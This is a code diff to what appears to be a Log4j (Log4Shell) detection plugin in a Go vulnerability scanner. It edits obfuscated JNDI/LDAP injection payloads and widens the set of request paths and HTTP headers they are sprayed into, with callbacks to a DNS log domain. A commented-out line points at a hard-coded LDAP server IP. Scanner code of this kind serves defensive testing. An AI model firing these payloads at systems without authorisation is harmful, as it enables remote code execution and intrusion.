@@ -49,9 +49,9 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	payloads := []string{
 		"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
 		"${jndi:lda${:-}p://",
-		"${j${aaa::::-n}di:ldap://}",
-		"${j${aaa::::-n}d${:-}i:ldap://}",
-		"${j${aaa::::-n}d${:-}i:ldap://}",
+		"${j${aaa::::-n}di:ldap://",
+		"${j${aaa::::-n}d${:-}i:ldap://",
+		"${j${aaa::::-n}d${:-}i:ldap://",
 		"${j${:-}n${:-}d${:-}i:l${:-}d${:-}a${:-}p://",
 	}
 
@@ -59,6 +59,9 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 		"/admin",
 		"/login",
 		"/signin",
+		"/error",
+		"/api",
+		"/redirect",
 	}
 
 	headers := []string{
@@ -81,6 +84,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 	for _, payload := range payloads {
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
+		// fullPayload := fmt.Sprintf("%s134.175.244.170:1389/by9aum}", payload)
 		for _, reqPath := range reqPaths {
 			for _, method := range methods {
 				var request *http.Request
@@ -98,6 +102,18 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 					request.Header.Set("Client-ip", fullPayload)
 					request.Header.Set("Cookie", fullPayload)
 					request.Header.Set("Authorization", fullPayload)
+					request.Header.Set("X-Forwarded-Ssl", fullPayload)
+					request.Header.Set("X-Forwarded-For-Original", fullPayload)
+					request.Header.Set("X-Forwarded-Host", fullPayload)
+					request.Header.Set("X-Forwarded-Proto", fullPayload)
+					request.Header.Set("True-Client-IP", fullPayload)
+					request.Header.Set("DNT", fullPayload)
+					request.Header.Set("X-CSRFToken", fullPayload)
+					request.Header.Set("CSRFToken", fullPayload)
+					request.Header.Set("JWT", fullPayload)
+					request.Header.Set("X-HTTP-Method-Override", fullPayload)
+					request.Header.Set("X-Request-ID", fullPayload)
+					request.Header.Set("X-X-ProxyUser-Ip-ID", fullPayload)
 					request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 					_, _ = util.RequestDo(request, false)
 				}
